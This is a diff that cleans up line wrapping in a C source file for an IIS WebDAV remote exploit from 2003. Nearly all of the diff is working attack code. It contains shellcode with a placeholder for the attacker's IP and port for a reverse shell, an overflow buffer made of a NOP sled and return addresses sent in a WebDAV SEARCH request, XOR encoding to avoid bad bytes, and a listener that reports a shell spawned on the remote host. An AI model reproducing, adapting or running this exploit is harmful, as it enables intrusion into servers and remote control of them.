@@ -1,7 +1,7 @@
 /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
-/*	    29/05/2003 - by Alumni -                   */
-/*              Microsoft IIS WebDAV New Exploit           */
-/*                 spawns shell on port 32768                 */
+/*	29/05/2003 - by Alumni -          */
+/*  Microsoft IIS WebDAV New Exploit  */
+/*    - spawns shell on port 32768    */
 /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
 
 #include <stdio.h>
@@ -71,11 +71,9 @@ char shellcode[SHELLCODELEN+1] =
 "\x7e\x02\x00\x00\x52\xff\x76\xf0\xff\x56\xfc\x8b"
 "\xd8\x6a\x06\x6a\x01\x6a\x02\xff\xd3\x89\x06\x8b"
 "\xd6\x83\xc2\x14\xb8"
-"\x7f\x00\x00\x01"		// put your ip here (run netcat before, 
-e.g. 127.0.0.1)
+"\x7f\x00\x00\x01"		// put your ip here (run netcat before, e.g. 127.0.0.1)
 "\x89\x42\x04\x66\xc7\x02\x02\x00\x66\xb8"
-"\x80\x00"			// specify connectious port here (e.g. 
-32768)
+"\x80\x00"			// specify connectious port here (e.g. 32768)
 "\x66\x89\x42"
 "\x02\x8b\xd5\x81\xc2\x8a\x02\x00\x00\x52\xff\x76"
 "\xf0\xff\x56\xfc\x8b\xd8\x6a\x10\x8b\xd6\x83\xc2"
@@ -127,16 +125,11 @@ e.g. 127.0.0.1)
 "\x52\x65\x61\x64\x46\x69\x6c\x65\x00";
 
 
-char xmlbody[] ="<?xml version=\"1.0\"?>\r\n<g:searchrequest 
-xmlns:g=\"DAV:\">\r\n"
-				"<g:sql>\r\nSelect \"DAV:displayname\" 
-from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";
-
+char xmlbody[] ="<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n"
+				"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";
 
 long retaddr, buffsize;
 char* buffer;
-
-
 
 unsigned long getlocalhostip()
 {
@@ -169,12 +162,10 @@ ULONG WINAPI AcceptThread(LPVOID lpParam)
 		while (1)
 		{
 			ln1 = sizeof(saddrin);
-			sacc = accept(slisten,(struct sockaddr*)
-&saddrin,&ln1);
+			sacc = accept(slisten,(struct sockaddr*)&saddrin,&ln1);
 			if (sacc!=INVALID_SOCKET)
 			{
-				printf("\n\nShell succesfully spawned on 
-remote host\nNetcat to %d",DEFPORT);
+				printf("\n\nShell succesfully spawned on remote host\nNetcat to %d",DEFPORT);
 				ExitProcess(0);
 			}
 		}
@@ -199,13 +190,9 @@ ULONG SendRequest (char* sHost, int iPort)
 	if (!connect(sock,(struct sockaddr*)&saddr_in,sizeof(saddr_in)))
 	{
 		timeout = 5000;
-		setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)
-&timeout,sizeof(timeout));
-		setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)
-&timeout,sizeof(timeout));
-		sprintf(buffsend,"SEARCH / HTTP/1.1\r\nHost:%s\r\nContent-
-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s%s",strlen(xmlbody)+strlen
-(buffer),xmlbody,buffer);
+		setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));
+		setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));
+		sprintf(buffsend,"SEARCH / HTTP/1.1\r\nHost:%s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s%s",strlen(xmlbody)+strlen(buffer),xmlbody,buffer);
 		send (sock,buffsend,strlen(buffsend),0);
 		closesocket(sock);
 	}
@@ -218,8 +205,7 @@ Type: text/xml\r\nContent-Length: %d\r\n\r\n%s%s",strlen(xmlbody)+strlen
 void dispUsage(char* str1)
 {
 	printf ("IIS WebDAV exploit by Alumni - The Matrix Reloaded -\n");
-	printf ("Usage: %s <ipv4dot> <port> [<buffsize>] [<retaddr>]
-\n\n",str1);
+	printf ("Usage: %s <ipv4dot> <port> [<buffsize>] [<retaddr>]\n\n",str1);
 	return;
 }
 
@@ -248,8 +234,7 @@ int main(int argc, char** argv)
 	buffer = (char*) malloc(buffsize+1);
 	ptr1 = (long*)buffer;
 	memset(buffer,0,buffsize);
-	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)
-AcceptThread,NULL,NULL,&uThread);
+	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) AcceptThread,NULL,NULL,&uThread);
 	
 	*(long*)(shellcode+GMHOFF) = GMH;
 	*(long*)(shellcode+GPAOFF) = GPA;
@@ -259,8 +244,7 @@ AcceptThread,NULL,NULL,&uThread);
 	{
 		int iBool = 1, j;
 		for (j=0;j<SHELLCODELEN;j++)
-			if ((shellcode[j]^i)==0 || (shellcode[j]^i)==0x0d 
-|| (shellcode[j]^i)==0x0a) iBool = 0;
+			if ((shellcode[j]^i)==0 || (shellcode[j]^i)==0x0d  || (shellcode[j]^i)==0x0a) iBool = 0;
 		if (iBool)
 		{
 			xorkey = i;
@@ -276,19 +260,16 @@ AcceptThread,NULL,NULL,&uThread);
 	strncat(buffer,prologue,buffsize);
 	
 	prologuelen = strlen(buffer);
-	for (i=prologuelen;i<SHELLCODELEN+prologuelen;i++) buffer[i] = 
-shellcode[i-prologuelen];
+	for (i=prologuelen;i<SHELLCODELEN+prologuelen;i++) buffer[i] = shellcode[i-prologuelen];
 	prologuelen = strlen(buffer);
 	buffer[prologuelen] = NOP;
 	buffer[prologuelen+1] = NOP;
 	buffer[prologuelen+2] = NOP;
 	buffer[prologuelen+3] = NOP;
-	for (i=(prologuelen+3) & (~3);i<buffsize;i+=sizeof(retaddr))  *
-(long*)(buffer+i) = retaddr;
+	for (i=(prologuelen+3) & (~3);i<buffsize;i+=sizeof(retaddr))  *(long*)(buffer+i) = retaddr;
 	buffer[buffsize] = 0;
 
 	printf ("%s",buffer);
-
 
 #ifdef DEBUGGEE_FLOW
 	__asm {
